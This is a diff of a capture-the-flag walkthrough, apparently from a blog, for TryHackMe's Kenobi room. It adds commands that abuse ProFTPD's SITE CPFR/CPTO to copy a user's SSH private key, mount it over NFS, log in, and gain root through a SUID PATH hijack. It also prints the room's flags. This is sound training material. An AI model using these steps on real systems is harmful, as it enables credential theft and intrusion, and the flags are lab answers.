@@ -104,27 +104,139 @@ We now need to findout how many exploits are there for ProFtpd that is running
 
 Now lets continue along
 
-```sudo mkdir /mnt/kenobiNFS```
+```nc 10.10.130.11 21```
 
-```sudo mount 10.10.130.11:/var /mnt/kenobiNFS```
+```SITE CPFR /home/kenobi/.ssh/id_rsa```
+
+```SITE CPTO /var/tmp/id_rsa```
+
+The above will copy over that key we need for Kenobi
+
+I had to wait a day to continue so the IP will be different
+----
+
+```mkdir /mnt/kenobiNFS```
+
+```sudo mount 10.10.189.226:/var /mnt/kenobiNFS```
 
 ```ls -la /mnt/kenobiNFS```
 
-Now in theory we should have a network mount that we can find the key for the login
+Now that we have a solid network mount we can copy that private key
 
+```sudo cp /mnt/kenobiNFS/tmp/id_rsa .```
 
+```sudo chmod 600 id_rsa```
 
+```ssh -i id_rsa kenobi@10.10.189.226```
 
+<img src="/images/TryHackMe/Kenobi/Error.PNG">
 
+Whelp... looks like the key is different on the new machine
 
+```sudo rm id_rsa```
 
+Now we need to redo a bit
 
+Now lets continue along
 
+```nc 10.10.189.226 21```
 
+```SITE CPFR /home/kenobi/.ssh/id_rsa```
 
+```SITE CPTO /var/tmp/id_rsa```
 
-<img src="/images/TryHackMe/Kenobi/Task 7.PNG">
+```mkdir /mnt/kenobiNFS```
 
+```sudo mount 10.10.189.226:/var /mnt/kenobiNFS```
+
+```ls -la /mnt/kenobiNFS```
+
+Now that we have a solid network mount we can copy that private key
+
+```sudo cp /mnt/kenobiNFS/tmp/id_rsa .```
+
+```sudo chmod 600 id_rsa```
+
+```ssh -i id_rsa kenobi@10.10.189.226```
+
+Now we should have success!
+
+<img src="/images/TryHackMe/Kenobi/Login.PNG">
+
+Lets find that flag
+
+```cat /home/kenobi/user.txt```
+
+<img src="/images/TryHackMe/Kenobi/Flag.PNG">
+
+My flag was **d0b0f3f53b6caa532a83915e19224899** but yours may be different
+
+Task 4
+----
+
+Now to learn about SUID
+
+After your reading they give us a big hint
+
+```find / -perm -u=s -type f 2>/dev/null```
+
+<img src="/images/TryHackMe/Kenobi/List.PNG">
+
+We should now see a list of files
+
+The answer box kind of gives an extra hint with the last / being only 4 letters
+
+**/usr/bin/menu** is the first answer for task 4
+
+Now we should run it!
+
+```/usr/bin/menu```
+
+<img src="/images/TryHackMe/Kenobi/Choices.PNG">
+
+**3** is the next answer!
+
+With some help from a guide we see that we can create a file named "curl" and have it in the tmp directory to help get root
+
+Lets go to the tmp folder
+
+```cd /tmp```
+
+Now we need to copy the sh file into the curl file we will use
+
+```echo /bin/sh > curl```
+
+Now lets give complete access to that file
+
+```chmod 777 curl```
+
+Now lets set PATH to that tmp folder
+
+```export PATH=/tmp:$PATH```
+
+Lets see if it works!
+
+```/usr/bin/menu```
+
+We can check with option 1
+
+```1```
+
+id should show us which user we currently are as well as the others (possibly?)
+
+```id```
+
+<img src="/images/TryHackMe/Kenobi/Root.PNG">
+
+Well we might as well see if we can find that root file!
+
+cat /root.root.txt
+
+<img src="/images/TryHackMe/Kenobi/Root_Flag.PNG">
+
+**177b3cd8562289f37382721c28381f02** is the final flag!!
+
+We made it!
 
 <br/><br/>
 [TryHackMe Directory](https://zacvr.github.io/Tutorials/TryHackMe/)
